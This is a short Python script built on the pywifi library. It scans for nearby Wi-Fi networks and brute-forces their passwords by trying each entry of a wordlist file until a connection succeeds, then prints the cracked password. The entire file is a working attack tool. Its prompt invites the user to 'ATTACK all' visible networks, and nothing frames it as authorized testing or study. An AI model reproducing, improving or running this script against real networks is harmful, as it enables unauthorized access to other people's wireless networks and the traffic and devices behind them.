#!/bin/python
# -*- coding: utf-8 -*-

from pywifi import *
import time
import sys

class hacker():
    def __init__(self):
        self.AKMS = {
            0:const.AKM_TYPE_NONE,
            1:const.AKM_TYPE_WPA,
            2:const.AKM_TYPE_WPAPSK,
            3:const.AKM_TYPE_WPA2,
            4:const.AKM_TYPE_WPA2PSK,
            5:const.AKM_TYPE_UNKNOWN
            }
        self.wifi = PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.ssids = {}
        self.passdic = open('pass.txt').read().strip('\n').split('\n')


    def connect(self,ssid,password):
        profile = Profile()
        profile.ssid = ssid
        profile.akm.append(self.ssids[ssid])
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        _profile = self.iface.add_network_profile(profile)
        print('Trying {0} for SSID {1}...'.format(password,ssid))
        start_time = time.time()
        self.iface.connect(_profile)
        code = 10
        while code!=0:
            time.sleep(0.1)
            code = self.iface.status()
            if time.time()-start_time > 5:
                break
        if self.iface.status() == const.IFACE_CONNECTED:
            ifconnect = True
        else:
            ifconnect = False
        self.iface.disconnect()
        time.sleep(1)
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return ifconnect



    def scan(self):
        wifis = self.iface.scan_results()
        for wifi in wifis:
            if not wifi.ssid:
                continue
            self.ssids[wifi.ssid] = self.AKMS[wifi.akm[0]]
        return 0
            
        
    def go(self,ssidkw='',skip=''):
        self.scan()
        ssids = [ssid for ssid in self.ssids if ssidkw in ssid] if ssidkw else self.ssids
        for _ssid in ssids:
            print("Attacking SSID {}".format(_ssid))
            if skip and skip in _ssid:
                continue
            for password in self.passdic:
                ifconnect = self.connect(_ssid,password)
                if ifconnect:
                    print("SUCCESS! SSID: {0} Password: {1}".format(_ssid,password))
                    input()
                    return 1
                else:
                    continue
                
        return 0

if __name__ == '__main__':
    ssidkw = input("Please input your target SSID KEYWORD(Leave it empty to ATTACK all):\t")
    skip = input("To be ignored SSID KEYWORD(Can be part of your own WIFI name):\t")
    hacker().go(ssidkw=ssidkw,skip=skip)
